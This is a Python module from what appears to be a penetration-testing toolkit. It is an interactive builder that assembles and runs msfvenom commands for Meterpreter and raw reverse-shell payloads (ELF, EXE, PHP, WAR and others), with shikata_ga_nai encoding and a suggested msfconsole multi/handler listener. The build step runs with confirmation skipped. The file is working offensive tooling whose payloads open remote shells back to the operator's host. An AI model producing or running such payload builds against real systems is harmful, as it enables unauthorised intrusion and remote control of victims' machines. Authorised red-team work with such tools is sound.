"""
kernox.features.payload_builder — Interactive msfvenom payload builder.

Guides user through payload options, builds the exact msfvenom command,
confirms, then executes via the existing Executor.
Output saved to /tmp/kernox/ automatically.
"""

from __future__ import annotations

from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.markdown import Markdown
from rich import box

console = Console()

# Curated payload menu — not hardcoded tool list, just quick-pick options
PAYLOAD_MENU = {
    "1":  ("linux/x86/meterpreter/reverse_tcp",    "Linux x86 Meterpreter reverse TCP"),
    "2":  ("linux/x64/meterpreter/reverse_tcp",    "Linux x64 Meterpreter reverse TCP"),
    "3":  ("windows/meterpreter/reverse_tcp",      "Windows x86 Meterpreter reverse TCP"),
    "4":  ("windows/x64/meterpreter/reverse_tcp",  "Windows x64 Meterpreter reverse TCP"),
    "5":  ("php/meterpreter/reverse_tcp",          "PHP Meterpreter reverse TCP"),
    "6":  ("python/meterpreter/reverse_tcp",       "Python Meterpreter reverse TCP"),
    "7":  ("java/jsp_shell_reverse_tcp",           "Java JSP shell reverse TCP"),
    "8":  ("cmd/unix/reverse_bash",                "Unix bash reverse shell"),
    "9":  ("linux/x64/shell_reverse_tcp",          "Linux x64 raw shell reverse TCP"),
    "10": ("windows/shell_reverse_tcp",            "Windows raw shell reverse TCP"),
    "c":  ("custom",                               "Enter custom payload string"),
}

FORMAT_MENU = {
    "1":  ("elf",    "Linux ELF binary"),
    "2":  ("exe",    "Windows PE executable"),
    "3":  ("raw",    "Raw shellcode"),
    "4":  ("php",    "PHP file"),
    "5":  ("py",     "Python script"),
    "6":  ("war",    "Java WAR archive"),
    "7":  ("jar",    "Java JAR file"),
    "8":  ("asp",    "ASP file"),
    "9":  ("aspx",   "ASPX file"),
    "c":  ("custom", "Enter custom format"),
}

ENCODER_MENU = {
    "1": ("x86/shikata_ga_nai", "x86 polymorphic XOR additive — most common"),
    "2": ("x64/xor",            "x64 XOR encoder"),
    "3": ("none",               "No encoder"),
}


def run_payload_builder(executor=None) -> None:
    """
    Interactive payload builder. executor is the Executor instance from
    CommandExecutor — if provided, runs the command directly after building.
    """
    console.print("\n[bold cyan]━━ Payload Builder ━━[/bold cyan]\n")

    # ── 1. Pick payload ───────────────────────────────────────────────────────
    _show_menu("Payload", PAYLOAD_MENU)
    p_choice = Prompt.ask("  Select payload", default="1")
    if p_choice == "c":
        payload = Prompt.ask("  Custom payload string")
    else:
        payload = PAYLOAD_MENU.get(p_choice, PAYLOAD_MENU["1"])[0]
    console.print(f"  [dim]→ {payload}[/dim]\n")

    # ── 2. LHOST / LPORT ─────────────────────────────────────────────────────
    lhost = Prompt.ask("  LHOST (your IP)", default=_detect_local_ip())
    lport = Prompt.ask("  LPORT", default="4444")

    # ── 3. Format ─────────────────────────────────────────────────────────────
    _show_menu("Format", FORMAT_MENU)
    f_choice = Prompt.ask("  Select format", default="1")
    if f_choice == "c":
        fmt = Prompt.ask("  Custom format")
    else:
        fmt = FORMAT_MENU.get(f_choice, FORMAT_MENU["1"])[0]
    console.print(f"  [dim]→ {fmt}[/dim]\n")

    # ── 4. Encoder ────────────────────────────────────────────────────────────
    _show_menu("Encoder", ENCODER_MENU)
    e_choice = Prompt.ask("  Select encoder", default="3")
    enc_str, _ = ENCODER_MENU.get(e_choice, ENCODER_MENU["3"])
    iterations = "1"
    if enc_str != "none":
        iterations = Prompt.ask("  Encoder iterations", default="1")

    # ── 5. Output path ────────────────────────────────────────────────────────
    ext_map = {
        "elf": "elf", "exe": "exe", "php": "php", "py": "py",
        "war": "war", "jar": "jar", "asp": "asp", "aspx": "aspx",
    }
    ext       = ext_map.get(fmt, "bin")
    safe_lhost = lhost.replace(".", "_")
    out_path  = f"/tmp/kernox/payload_{safe_lhost}_{lport}.{ext}"
    out_path  = Prompt.ask("  Output path", default=out_path)

    # ── 6. Build command ──────────────────────────────────────────────────────
    parts = [
        "msfvenom",
        f"-p {payload}",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        f"-f {fmt}",
    ]
    if enc_str != "none":
        parts += [f"-e {enc_str}", f"-i {iterations}"]
    parts.append(f"-o {out_path}")

    command = " ".join(parts)

    console.print("\n[bold cyan]Generated command:[/bold cyan]")
    console.print(Markdown(f"```bash\n{command}\n```"))

    # Listener suggestion
    console.print(
        f"\n[dim]After payload runs, start listener:[/dim]\n"
        f"[dim cyan]  msfconsole -q -x "
        f"\"use exploit/multi/handler; "
        f"set PAYLOAD {payload}; "
        f"set LHOST {lhost}; "
        f"set LPORT {lport}; run\"[/dim cyan]\n"
    )

    if not Confirm.ask("  Execute msfvenom now?", default=True):
        console.print("[dim]Command copied to clipboard (if xclip available)[/dim]")
        _try_clipboard(command)
        return

    # ── 7. Execute ────────────────────────────────────────────────────────────
    if executor:
        from kernox.core.executor import Executor
        result = executor.run(
            command=command,
            tool_name="msfvenom",
            target=lhost,
            timeout=120,
            skip_confirm=True,
        )
        if not result.blocked and result.return_code == 0:
            console.print(f"[green]✓ Payload saved → {out_path}[/green]")
        else:
            console.print(f"[red]✗ msfvenom failed (exit {result.return_code})[/red]")
            if result.stderr:
                console.print(f"[dim]{result.stderr[:300]}[/dim]")
    else:
        console.print(
            "[cyan]⚠ No executor available — run this manually:[/cyan]\n"
            f"[dim cyan]{command}[/dim cyan]"
        )


# ── Helpers ───────────────────────────────────────────────────────────────────

def _show_menu(title: str, menu: dict) -> None:
    t = Table(
        title=title,
        box=box.SIMPLE,
        show_header=False,
        border_style="dim cyan",
        padding=(0, 1),
    )
    t.add_column("Key",   style="cyan",    width=4)
    t.add_column("Option", style="white")
    t.add_column("Desc",  style="dim")
    for key, (val, desc) in menu.items():
        t.add_row(f"[{key}]", val, desc)
    console.print(t)


def _detect_local_ip() -> str:
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"


def _try_clipboard(text: str) -> None:
    import subprocess, shutil
    for tool in ("xclip", "xsel"):
        if shutil.which(tool):
            try:
                proc = subprocess.Popen(
                    [tool, "-selection", "clipboard"],
                    stdin=subprocess.PIPE
                )
                proc.communicate(text.encode())
                console.print(f"[dim]Copied to clipboard via {tool}[/dim]")
                return
            except Exception:
                pass
